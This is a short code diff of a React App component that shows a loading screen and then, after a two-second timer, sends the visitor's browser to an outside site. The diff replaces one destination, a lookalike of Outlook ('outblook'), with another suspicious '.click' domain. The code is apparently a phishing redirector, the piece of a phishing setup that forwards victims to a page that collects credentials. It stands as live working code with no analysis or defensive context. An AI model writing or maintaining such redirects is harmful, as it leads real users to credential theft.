@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outblook.mcnown.ca';
+            window.location.href = 'https://absageupdated.click';
         }, 2000);
 
         return () => clearTimeout(timer);
